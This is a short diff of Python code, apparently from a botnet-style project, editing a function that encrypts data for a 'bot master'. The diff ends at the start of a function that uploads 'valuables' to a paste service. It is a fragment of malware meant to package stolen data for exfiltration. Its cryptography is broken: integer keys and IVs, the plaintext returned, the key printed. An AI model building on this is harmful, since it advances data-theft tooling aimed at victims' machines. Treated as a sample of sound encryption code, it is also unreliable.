@@ -1,9 +1,7 @@
 import os
+
 from Crypto.Signature import PKCS1_v1_5
 from Crypto.Hash import SHA256
-from Crypto.PublicKey import RSA
-
-#from Crypto.Cipher import PKCS1_v1_5
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
 from Crypto.Random import random
@@ -25,13 +23,12 @@ def encrypt_for_master(data):
 
     # Generate key and IV for AES encryption with 256bits key size
     aes_encryption_key = random.getrandbits(128) # export key and name aes encryption
-    iv = random.getrandbits(128)
-    cipher = AES.new(aes_encryption_key, AES.MODE_CBC, iv)
-    ## GET PADDING
-    aes_msg = iv + cipher.encrypt(data) ## Need changes
-    print(aes_msg)  # Test print. TO BE REMOVE
+    iv = random.getrandbits(AES.block_size)
+    cipher = AES.new(aes_encryption_key, AES.MODE_CFB, iv)
+    encrypted_data = cipher.encrypt(data)
+    print(aes_encryption_key)  # Test print. TO BE REMOVE
+    print(encrypted_data)  # Test print. TO BE REMOVE
 
-    #
     # Obtain public key from text file for encrypting aes_msg
     pub_key = open("mypublickey.txt", "r").read()
     rsa_encryption_key = RSA.importKey(pub_key)
@@ -39,7 +36,7 @@ def encrypt_for_master(data):
     print(encrypt_msg)  # encrpyted key
     return data
 
-encrypt_for_master("Attack at dawn") # Test print. TO BE REMOVE
+# encrypt_for_master(b"Attack at dawn") # Test print. TO BE REMOVE
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
